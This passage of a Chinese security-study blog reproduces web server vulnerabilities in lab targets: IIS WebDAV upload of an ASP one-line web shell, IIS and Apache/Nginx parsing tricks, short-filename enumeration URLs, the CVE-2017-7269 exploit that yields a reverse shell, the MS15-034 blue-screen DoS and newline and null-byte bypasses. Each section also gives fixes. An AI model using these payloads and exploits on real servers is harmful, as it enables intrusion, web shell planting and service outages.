href="#原理" class="headerlink" title="原理"></a>原理</h4><p>IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。</p><p>影响版本：IIS 6.0</p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><p>查看靶机的iis管理器，开启webDAV和网站的写入权限</p><p><img src="/2021/12/09/day36/image-20211221154157188.png" alt="image-20211221154157188"></p><p><img src="/2021/12/09/day36/image-20211221154231260.png" alt="image-20211221154231260"></p><p>接着我们用burp抓包</p><p><img src="/2021/12/09/day36/image-20211221154407120.png" alt="image-20211221154407120"></p><p>将GET改为OPTIONS提交，查看所支持的协议</p><p><img src="/2021/12/09/day36/image-20211221154443454.png" alt="image-20211221154443454"></p><p>可以看到支持PUT协议</p><p>接下来思路是，先用PUT协议创建一个txt文件，文件中写入asp一句话，再用MOVE修改文件名为asp后缀，这样脚本就能被解析执行</p><pre class="line-numbers language-none"><code class="language-none">PUT /test.txt HTTP/1.1 Host: upload.moonteam.com Content-Length: 25 &lt;%eval request("cmd")%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211221154922672.png" alt="image-20211221154922672"></p><p><img src="/2021/12/09/day36/image-20211221155047849.png" alt="image-20211221155047849"></p><p>test.txt创建成功</p><pre class="line-numbers language-none"><code class="language-none">MOVE /test.txt HTTP/1.1 Host: upload.moonteam.com Destination: http://upload.moonteam.com/shell.asp <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211221155408459.png" alt="image-20211221155408459"></p><p><img src="/2021/12/09/day36/image-20211221155427224.png" alt="image-20211221155427224"></p><p>可以看到test.txt成功被改为shell.asp了</p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><ol><li>关闭webdav</li><li>关闭写入权限</li></ol><h3 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h3><h4 id="基于文件名"><a href="#基于文件名" class="headerlink" title="基于文件名"></a>基于文件名</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>该版本默认将*.asp;.jpg 此种格式的文件名，当成Asp解析。服务器默认不解析 ; 号及其后面的内容，相当于截断。</p><p>iis除了会将asp解析成脚本执行文件之外，还会将 cer cdx asa扩展名解析成asp</p><p>我们在主目录配置下看到这几个扩展名    都执行同asp一样的文件<strong>C:\WINDOWS\system32\inetsrv\asp.dll</strong>，所以都被解析成asp</p><p><img src="/2021/12/09/day36/image-20211221160219223.png" alt="image-20211221160219223"></p><h5 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h5><p>我们上传或者创建文件，格式为*.asp;.jpg</p><p>我们在这里准备一个后门，sb.asp;1.jpg</p><p><img src="/2021/12/09/day36/image-20211221160656193.png" alt="image-20211221160656193"></p><p><img src="/2021/12/09/day36/image-20211221160729522.png" alt="image-20211221160729522"></p><h5 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h5><ol><li>禁止上传或常见此类畸形文件</li><li>图片存放的目录禁止执行脚本文件</li><li>升级iis版本 </li></ol><h4 id="基于文件夹"><a href="#基于文件夹" class="headerlink" title="基于文件夹"></a>基于文件夹</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><p>该版本默认将*.asp/目录下的所有文件当作asp解析</p><h5 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h5><p>创建.asp文件夹，将图片后门格式放到此文件夹</p><p><img src="/2021/12/09/day36/image-20211221161049625.png" alt="image-20211221161049625"></p><p><img src="/2021/12/09/day36/image-20211221161217840.png" alt="image-20211221161217840"></p><p>看到图片格式的后门也作为asp解析了</p><h5 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h5><ol><li>进制常见此类文件夹</li><li>升级iis版本</li></ol><h3 id="iis短文件漏洞"><a href="#iis短文件漏洞" class="headerlink" title="iis短文件漏洞"></a>iis短文件漏洞</h3><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>Windows 以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位Windows的程序访问这些文件。</p><p>在cmd下输入”dir /x”即可看到短文件名的效果。</p><p><img src="/2021/12/09/day36/image-20211222105843497.png" alt="image-20211222105843497"></p><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>当后缀小于4时，短文件名产生需要文件(夹)名前缀字符长度大于等于9位。</p><p>当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名。</p><p>目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六 种</p><p>IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功</p><h4 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h4><blockquote><p> IIS8.0以下版本需要开启ASP.NET支持，IIS&gt;=8.0版本,即使没有安装ASP.NET，通过OPTIONS和TRACE方法也可以猜解成功。</p></blockquote><p>我们这里开启IIS6.0 ASP.NET</p><p><img src="/2021/12/09/day36/image-20211222110144084.png" alt="image-20211222110144084"></p><p>短文件名特征：</p><ol><li><p>.只显示前6位的字符,后续字符用~1代替。其中数字1是可以递增。如果存在文件名类似的文件,则前面的6个字符是相同的,后面的数字进行递增</p><p><img src="/2021/12/09/day36/image-20211222111521319.png" alt="image-20211222111521319"></p></li><li><p>后缀名最长只有3位,超过3位的会生成短文件名,且后缀多余的部分会截断。<img src="/2021/12/09/day36/image-20211222111649177.png" alt="image-20211222111649177"></p></li><li><p>所有小写字母均转换成大写的字母</p></li><li><p>长文件名中包含多个”.”的时候,以文件最后一个”.”作为短文件名的后缀<img src="/2021/12/09/day36/image-20211222111746912.png" alt="image-20211222111746912"></p></li><li><p>长文件名前缀/文件夹名字符长度符合0-9和A-Z、a-z范围且需要大于等于9位才会生成短文件名,如果包含空格或者其他部分特殊字符,不论长度均会生成短文件。<img src="/2021/12/09/day36/image-20211222112413873.png" alt="image-20211222112413873"></p></li></ol><h5 id="手工"><a href="#手工" class="headerlink" title="手工"></a>手工</h5><p>使用payload验证目标是否存在IIS短文件名漏洞</p><p>*可以匹配0或多个字符</p><pre class="line-numbers language-none"><code class="language-none">http://upload.moonteam.com/*~1*/a.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211222112837069.png" alt="image-20211222112837069"></p><p>显示的404,说明目标存在该短文件名</p><pre class="line-numbers language-none"><code class="language-none">http://upload.moonteam.com/zzzzzz*~1*/a.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211222112957864.png" alt="image-20211222112957864"></p><p>如果访问不存在的短文件名，会返回 Bad Request，说明文件不存在</p><p>我们通过这俩个payload，可以验证是否存在短文件漏洞，证明存在之后就要手工猜解出文件名</p><p>假如我们猜解的为abcde1231111.txt文件，他的前缀大于9位显然是个短文件</p><pre class="line-numbers language-none"><code class="language-none">http://upload.moonteam.com/a*~1*/a.aspxhttp://upload.moonteam.com/b*~1*/a.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211222113702910.png" alt="image-20211222113702910"></p><p><img src="/2021/12/09/day36/image-20211222113710046.png" alt="image-20211222113710046"></p><p>这俩张截图可以看出猜解的文件是以a开头的，接下来继续</p><pre class="line-numbers language-none"><code class="language-none">http://upload.moonteam.com/ab*~1*/a.aspxhttp://upload.moonteam.com/abc*~1*/a.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这样逐渐猜解出文件名，猜解出文件名之后，我们需要知道此文件名所代表的是文件还是文件夹</p><pre class="line-numbers language-none"><code class="language-none">http://upload.moonteam.com/abcde*~1.a*/a.aspxhttp://upload.moonteam.com/abcde*~1.t*/a.aspxhttp://upload.moonteam.com/abcde*~1.txt*/a.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211222114058310.png" alt="image-20211222114058310"></p><p>这样就知道他所代表的是一个txt的文件</p><h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><p>像上面这种猜解比较费时间，我们可以寻找短文件名工具来提高效率</p><p><img src="/2021/12/09/day36/image-20211222114331821.png" alt="image-20211222114331821"></p><p>放到kali里</p><pre class="line-numbers language-none"><code class="language-none">python iis_shortname_Scan.py http://upload.moonteam.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211222114437099.png" alt="image-20211222114437099"></p><h4 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h4><ol><li><p>升级.net framework</p></li><li><p>修改注册表的键值</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem</p><p>修改NtfsDisable8dot3NameCreation为1。修改完成后,需要重启系统生效。</p><p>命令行关闭 执行fsutil behavior set disable8dot3 1，也可达到同样效果</p></li></ol><p>win+r regedit</p><p><img src="/2021/12/09/day36/image-20211222114935630.png" alt="image-20211222114935630"></p><p>改为1之后，重启可以生效，这样创建出来的文件不会是短文件</p><p>但是已经存在的短文件无法移除，需要重新拷贝到另一个地方，删除原来的，再重命名回原来的名字，这样才会生效</p><h3 id="iis-RCE-CVE-2017-7269"><a href="#iis-RCE-CVE-2017-7269" class="headerlink" title="iis RCE-CVE-2017-7269"></a>iis RCE-CVE-2017-7269</h3><p>iis6.0的远程代码执行</p><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>Microsoft windows Server 2003 R2中的 Internet信息服务IIS6.0中的 WebDAV服务中的ScStoragePathFromUrl函数存在缓冲区溢出，允许远程攻击者通过以 If:&lt;http:// 开头的长标头执行任意代码 PROPFIND请求</p><p>影响版本：WiNdows Server 2003 R2上使用IIS6.0并开启 WebDAV扩展。</p><h4 id="复现-4"><a href="#复现-4" class="headerlink" title="复现"></a>复现</h4><p><img src="/2021/12/09/day36/image-20211222140628107.png" alt="image-20211222140628107"></p><p>首先，我们此exp下载下来</p><p>下载前先再虚拟机把代理挂上</p><pre class="line-numbers language-none"><code class="language-none">proxychains git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载好exp后，我们看下目标的ip</p><p><img src="/2021/12/09/day36/image-20211222143830594.png" alt="image-20211222143830594"></p><pre class="line-numbers language-none"><code class="language-none">python iis6exp 192.168.80.129 80 192.168.80.128 1234 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211222144858973.png" alt="image-20211222144858973"></p><p>这里看到已经弹shell，ip已经是目标的ip了</p><h4 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h4><ol><li>关闭webDAV服务</li><li>升级</li><li>部署安全设备</li></ol><h2 id="iis7x"><a href="#iis7x" class="headerlink" title="iis7x"></a>iis7x</h2><h3 id="iis7x文件解析漏洞"><a href="#iis7x文件解析漏洞" class="headerlink" title="iis7x文件解析漏洞"></a>iis7x文件解析漏洞</h3><h4 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h4><p>IIS7.x版本在Fast-CGl运行模式下，在任意文件，例：a001.jpg/png后面加上/.php，会将a001.jpg/png解析为php文件</p><h4 id="复现-5"><a href="#复现-5" class="headerlink" title="复现"></a>复现</h4><p>我们上传图片到网站根目录，访问它</p><p><img src="/2021/12/09/day36/image-20211223101303731.png" alt="image-20211223101303731"></p><p>看到此图片没有作为php解析，这时我们在其后加上/.php</p><p><img src="/2021/12/09/day36/image-20211223101402872.png" alt="image-20211223101402872"></p><p>看到图片做为php解析了</p><h4 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h4><ol><li><p>再phpini中配置 cgi fix_pathinfo=0 重启phpcgi</p></li><li><p>再iis管理中的处理程序映射中修改请求限制，打勾即可</p><p><img src="/2021/12/09/day36/image-20211223102152654.png" alt="image-20211223102152654"></p><p>这样就不会造成解析漏洞<img src="/2021/12/09/day36/image-20211223102244348.png" alt="image-20211223102244348"></p></li></ol><h3 id="HTTP-SYS远程代码执行-MS15-034"><a href="#HTTP-SYS远程代码执行-MS15-034" class="headerlink" title="HTTP.SYS远程代码执行(MS15-034)"></a>HTTP.SYS远程代码执行(MS15-034)</h3><h4 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h4><p>HTTP.SYS是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.SYS</p><p>HTTP.SYS远程代码执行漏洞实质是<strong>HTTP.SYS的整数溢出漏洞</strong>，当攻击者向受影响的Windows系统发送特殊设计的HTTP 请求，HTTP.sys 未正确分析时就会导致此漏洞，成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。</p><p>主要存在Windows+IIS的环境下，任何安装了微软IIS 6.0以上的Windows Server 2008 R2/Server2012/Server 2012 R2以及Windows 7/8/8.1操作系统都受到这个漏洞的影响</p><p>影响范围：Windows7、Windows server 2008 R2、Windows8、Windows server2012、Windows8.1和Windows server 2012 R2</p><p>影响版本：IIS7.5、IIS8.0、IIS8.5</p><h4 id="复现-6"><a href="#复现-6" class="headerlink" title="复现"></a>复现</h4><p>我们访问此靶机网站</p><p><img src="/2021/12/09/day36/image-20211223102848264.png" alt="image-20211223102848264"></p><p>抓包后编辑，增加字段 Range: bytes=0-18446744073709551615，若返回码状态为416 RequestedRange Not Satisfiable，则存在HTTP.SYS远程代码执行漏洞。</p><p>直接增加字段为304，我们删除一些包信息</p><p><img src="/2021/12/09/day36/image-20211223103111584.png" alt="image-20211223103111584"></p><p><img src="/2021/12/09/day36/image-20211223103128619.png" alt="image-20211223103128619"></p><p>说明存在HTTP.SYS远程代码执行漏洞</p><p>我们下载poc，做一个dos的效果</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/davidjura/MS15-034-IIS-Active-DoS-Exploit-PoC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>kali上拉取此poc</p><p><img src="/2021/12/09/day36/image-20211223103751108.png" alt="image-20211223103751108"></p><p>运行脚本，填补信息</p><p><img src="/2021/12/09/day36/image-20211223104146812.png" alt="image-20211223104146812"></p><p>返回靶机看到已经蓝屏了</p><p><img src="/2021/12/09/day36/image-20211223104119971.png" alt="image-20211223104119971"></p><p>达到了dos的效果</p><h3 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a>修复</h3><p>打补丁，KB3042553</p><h2 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h2><p>Apache 是世界使用排名第一的 Web 服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的 Web 服务器端软件之一。</p><p>apache的目录结构</p><pre class="line-numbers language-none"><code class="language-none">bin：存放常用命令工具，如httpd cgi-bin：存放linux下常用命令，如xxx.sh error：错误记录 htdocs：网站源码 icons：网站图标 manual：手册 modules：扩展模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="未知扩展名解析漏洞"><a href="#未知扩展名解析漏洞" class="headerlink" title="未知扩展名解析漏洞"></a>未知扩展名解析漏洞</h3><h4 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h4><p>Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别，则继续向左识别，直到识别到合法后缀才进行解析。</p><h4 id="复现-7"><a href="#复现-7" class="headerlink" title="复现"></a>复现</h4><p>假如上传了一个a.php.qqq，依照此特性，.qqq不认识，继续向左解析，.php认识，就会被解析为php文件。</p><p>关于apache，不在mime.types文件中的都不认识</p><p><img src="/2021/12/09/day36/image-20211223153503138.png" alt="image-20211223153503138"></p><ol><li> 使用module模式与php结合的所有版本apache存在此漏洞。</li><li>使用fastcgi模式与php结合的所有版本apache不存在此漏洞。</li><li> 利用此漏洞时必须保证扩展名中至少带有一个.php，不然将默认作为txt/html文档处理。</li></ol><p>我们再kali上复现此漏洞</p><pre class="line-numbers language-none"><code class="language-none">sudo service apache2 restart cd /etc/apache2/mods-enabled sudo vi php7.4.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211223154115032.png" alt="image-20211223154115032"></p><p>正则表达式中，$用来匹配字符串结尾位置。如果设置了RegExp对象的Multiline属性的条件下，还会匹配到字符串结尾的换行符”\n”或”\r”。</p><p>这里我们把$改为\.，即可做到此漏洞效果</p><p>修改后我们重启apache服务</p><p>firefox localhost 打开</p><p><img src="/2021/12/09/day36/image-20211223154753875.png" alt="image-20211223154753875"></p><p>看到作为php解析了</p><h4 id="修复-7"><a href="#修复-7" class="headerlink" title="修复"></a>修复</h4><ol><li><p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为*.php.*的访问权限：</p><pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch ".(php.|php3.|php4.|php5.)"&gt; Order Deny,Allow Deny from all &lt;/FilesMatch&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果需要保留此文件名，我们可以替换文件名中的.为_</p><pre class="line-numbers language-none"><code class="language-none">$filename = str_replace('.', '_', $filename);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="AddHandler导致的解析漏洞"><a href="#AddHandler导致的解析漏洞" class="headerlink" title="AddHandler导致的解析漏洞"></a>AddHandler导致的解析漏洞</h3><h4 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h4><p>apache在解析文件时有一个原则，碰到不认识的扩展名就会向前解析，直到遇到认识的扩展名。如果都不认识，就会暴露源码。</p><p>apache在配置不当时就会导致解析漏洞</p><h4 id="复现-8"><a href="#复现-8" class="headerlink" title="复现"></a>复现</h4><p>在httpd.conf中 把下列注释去掉，后缀是存在.php .phtml都会解析成php文件</p><pre class="line-numbers language-none"><code class="language-none">AddType application/x-httpd-php .php .phtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211223160551123.png" alt="image-20211223160551123"></p><p>修改后重启，在网站根目录下创建</p><p><img src="/2021/12/09/day36/image-20211223160744373.png" alt="image-20211223160744373"></p><p><img src="/2021/12/09/day36/image-20211223160753574.png" alt="image-20211223160753574"></p><p>可以看到作为php解析了</p><h4 id="修复-8"><a href="#修复-8" class="headerlink" title="修复"></a>修复</h4><ol><li><p>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为*.php.*的访问权限：</p><pre class="line-numbers language-none"><code class="language-none">&lt;FilesMatch ".(php.|php3.|php4.|php5.)"&gt; Order Deny,Allow Deny from all &lt;/FilesMatch&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>将配置不当的地方配置得当</p></li></ol><h3 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h3><h4 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h4><p>当客户端访问到一个目录时，Apache服务器将会默认寻找一个index list中的文件，若文 件不存在，则会列出当前目录下所有文件或返回403状态码，导致目录遍历。</p><h4 id="复现-9"><a href="#复现-9" class="headerlink" title="复现"></a>复现</h4><p>httpd.conf</p><pre class="line-numbers language-none"><code class="language-none">DocumentRoot "C:\phpStudy\WWW" &lt;Directory /&gt; Options +Indexes +FollowSymLinks +ExecCGI AllowOverride All Order allow,deny Allow from all Require all granted &lt;/Directory&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211223161355494.png" alt="image-20211223161355494"></p><p>这时，访问一个目录</p><p><img src="/2021/12/09/day36/image-20211223161458489.png" alt="image-20211223161458489"></p><p>可以看到是一个遍历的状态</p><p><img src="/2021/12/09/day36/image-20211223161643926.png" alt="image-20211223161643926"></p><h4 id="修复-9"><a href="#修复-9" class="headerlink" title="修复"></a>修复</h4><p>在httpd.conf文件中找到Options + Indexes + FollowSymLinks + ExecCGI并修改成Options -Indexes +FollowSymLinks + ExecCGI并保存（吧+修改为-）</p><pre class="line-numbers language-none"><code class="language-none">+ 允许目录浏览- 进制目录浏览<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/12/09/day36/image-20211223161843692.png" alt="image-20211223161843692"></p><p>重启服务后，刷新页面</p><p><img src="/2021/12/09/day36/image-20211223161908282.png" alt="image-20211223161908282"></p><p>看到进制目录遍历了</p><h3 id="HTTPD-换行解析漏洞-CVE-2017-15715"><a href="#HTTPD-换行解析漏洞-CVE-2017-15715" class="headerlink" title="HTTPD 换行解析漏洞(CVE-2017-15715)"></a>HTTPD 换行解析漏洞(CVE-2017-15715)</h3><h4 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h4><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。</p><p>其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0a将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p>这里获取文件名是需要单独post一个name的，因为如果通过 $_FILES[‘file’][‘name’] 获取文件名的话，会把\x0a自动去除，所以 $_FILES[‘file’][‘name’] 这种方式获取文件名就不会造成这个漏洞</p><p>影响版本：apache ：2.4.0~2.4.29版本</p><h4 id="复现-10"><a href="#复现-10" class="headerlink" title="复现"></a>复现</h4><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt; &lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;/head&gt; &lt;body&gt;&lt;form action="" method="post" enctype="multipart/form-data"&gt; &lt;label for="file"&gt;文件名：&lt;/label&gt; &lt;input type="file" name="file" id="file"&gt;&lt;br&gt; &lt;input type="text" name="name" &lt;br&gt; &lt;input type="submit" name="submit" value="提交"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; &lt;br /&gt; &lt;?php if(isset($_FILES['file'])){ \#1.php php $name =basename($_POST['name']); $ext = pathinfo($name,PATHINFO_EXTENSION); $array=array('php','php3','php4','php5','phtml','pht'); if(in_array($ext,$array)){ exit('bad file'); }move_uploaded_file($_FILES['file']['tmp_name'],'./'.$name); }?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后台是通过黑名单方式过滤了php后缀的文件</p><p>如果设置了 RegExp对象的 Multiline属性，则也匹配 \n 或 \r恰好，我们在文件末尾加了0x0a（n），所以被匹配成功了。</p><blockquote><p>0x0a和0x0d</p><p>1.0x0d \r CR这三者代表是回车，是同一个东西，回车的作用只是移动光标至该行的起始位置 </p><p>2.0x0a \n CL这三者代表换行，是同一个东西，换行至下一行行首起始位置；</p></blockquote><p>打开</p><pre class="line-numbers language-none"><code class="language-none">sudo docker run -d -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=0.0.0.0 7ea558c9f385 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同步镜像后，搜索CVE-2017-15715，下载，然后开启镜像</p><p>我们在本机创建一个upload.html，内容为上面的上传代码，action填入ip和镜像端口</p><p><img src="/2021/12/09/day36/image-20211223180936253.png" alt="image-20211223180936253"></p><p>之后我们上传一个1.txt，其中写入php代码</p><p>抓包</p><p><img src="/2021/12/09/day36/image-20211223181421959.png" alt="image-20211223181421959"></p><p>然后我们在hex修改，</p><p><img src="/2021/12/09/day36/image-20211223181609959.png" alt="image-20211223181609959"></p><p>修改后为换行符</p><p><img src="/2021/12/09/day36/image-20211223181750805.png" alt="image-20211223181750805"></p><p> 然后我们访问这个文件</p><p><img src="/2021/12/09/day36/image-20211223181709487.png" alt="image-20211223181709487"></p><p>无法访问，我们加上换行符%0a，才能访问</p><p><img src="/2021/12/09/day36/image-20211223181817175.png" alt="image-20211223181817175"></p><h4 id="修复-10"><a href="#修复-10" class="headerlink" title="修复"></a>修复</h4><ol><li>升级到最新版本</li><li>或将上传的文件重命名为为时间戳+随机数+.jpg的格式，并禁用上传文件目录执行</li></ol><h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><p>Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like协议下发行。其特点是占有内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好。</p><h3 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h3><p>该漏洞是由于Nginx中php配置不当而造成的，<strong>与Nginx版本无关</strong>，但在高版本的php中，由于security.limit_extensions的引入，使得该漏洞难以被成功利用。</p><h4 id="原理-11"><a href="#原理-11" class="headerlink" title="原理"></a>原理</h4><p>Nginx的处理程序和FastCGI处理程序不同导致</p><p>Nginx拿到URL为/1.jpg/xxx.php后，识别处后缀是.php，认为是php文件，转交给PHP FastCGI处理程序去处理。PHP FastCGI处理程序识别该URI： /1.jpg/xxx.php不存在，按照PHP FastCGI处理程序自己的规则，删去最后的/xxx.php，又看/1.jpg存在，就将/1.jpg当成要执行的文件，就成功解析。</p><p>cgi.fix_pathinfo为php中的一个选项，默认开启为1，作用为修理路径，也就是对路径URL的处理规则</p><p><img src="/2021/12/09/day36/image-20211224113027867.png" alt="image-20211224113027867"></p><p>当php遇到文件路劲为/1.jpg/xxx.php/ss.001时，该文件不存在，会删除最后的/ss.001，再判断/1.jpg/xxx.php是否存在，若存在则将/1.jpg/xxx.php当作/1.jpg/xxx.php/ss.001文件，若不存在，则继续删除最后一个路径。删除的多余路径会存在PATH_INFO中，在这里为ss.001</p><p><img src="/2021/12/09/day36/image-20211224113038276.png" alt="image-20211224113038276"></p><h4 id="复现-11"><a href="#复现-11" class="headerlink" title="复现"></a>复现</h4><p>首先查看cgi.fix_pathinfo</p><p><img src="/2021/12/09/day36/image-20211224113206536.png" alt="image-20211224113206536"></p><p>默认为1，即存在此漏洞</p><p><img src="/2021/12/09/day36/image-20211224113122067.png" alt="image-20211224113122067"></p><h4 id="修复-11"><a href="#修复-11" class="headerlink" title="修复"></a>修复</h4><ol><li>将php.ini文件中的cgi.fix_pathinfo的值设置为0,这样php再解析1.php/1.jpg这样的目录时,只要1.jpg不存在就会显示404页面</li><li>php-fpm.conf中的security.limit_extensions后面的值设置为.php</li></ol><h3 id="目录遍历漏洞-1"><a href="#目录遍历漏洞-1" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h3><p>nginx的目录遍历跟apache一样，是配置不当引起的</p><h4 id="原理-12"><a href="#原理-12" class="headerlink" title="原理"></a>原理</h4><p>修改nginx.conf</p><p>修改为</p><pre class="line-numbers language-none"><code class="language-none">autoindex on; 开启目录浏览autoindex off; 关闭目录浏览<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>默认是关闭状态</p><h4 id="复现-12"><a href="#复现-12" class="headerlink" title="复现"></a>复现</h4><p><img src="/2021/12/09/day36/image-20211224113627340.png" alt="image-20211224113627340"></p><p>重启</p><p><img src="/2021/12/09/day36/image-20211224114229729.png" alt="image-20211224114229729"></p><h4 id="修复-12"><a href="#修复-12" class="headerlink" title="修复"></a>修复</h4><p>设置autoindex off; 关闭目录浏览</p><h3 id="空字节代码执行漏洞"><a href="#空字节代码执行漏洞" class="headerlink" title="空字节代码执行漏洞"></a>空字节代码执行漏洞</h3><h4 id="原理-13"><a href="#原理-13" class="headerlink" title="原理"></a>原理</h4><p>在使用PHP-FastCGI执行php的时候，URL里面在遇到%00空字节时与FastCGI处理不一致，导致可在非php文件中嵌入php代码，通过访问url+%00.php来执行其中的php代码。</p><p>影响版本：</p><p>nginx 0.5.* </p><p>nginx 0.6.* </p><p>nginx 0.7 &lt;= 0.7.65 </p><p>nginx 0.8 &lt;= 0.8.37</p><p>所以我们在碰到nginx版本小于1可以考虑此漏洞</p><h4 id="复现-13"><a href="#复现-13" class="headerlink" title="复现"></a>复现</h4><p>在根目录下添加1.jpg</p><p><img src="/2021/12/09/day36/image-20211224114939413.png" alt="image-20211224114939413"></p><p>访问</p><p><img src="/2021/12/09/day36/image-20211224114958666.png" alt="image-20211224114958666"></p><p>抓包，由于此图片非正常，burp抓不到，所以我们在末尾添加..让其能被抓到</p><p><img src="/2021/12/09/day36/image-20211224115051319.png" alt="image-20211224115051319"></p><p>我们修改为/1.jpg..php，在hex修改，将第一个.的2e修改为00</p><p><img src="/2021/12/09/day36/image-20211224115314127.png" alt="image-20211224115314127"></p><p>其实就是%00</p><p><img src="/2021/12/09/day36/image-20211224115330205.png" alt="image-20211224115330205"></p><p>可以看到被解析为php了</p><h4 id="修复-13"><a href="#修复-13" class="headerlink" title="修复"></a>修复</h4><ol><li><p>在nginx虚拟机配置或fcgi.conf添加</p><pre class="line-numbers language-none"><code class="language-none">if ($request_filename ~* (.*)\.php) { set $php_url $1; }if (!-e $php_url.php) { return 403; }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>升级nginx版本</p></li></ol><h3 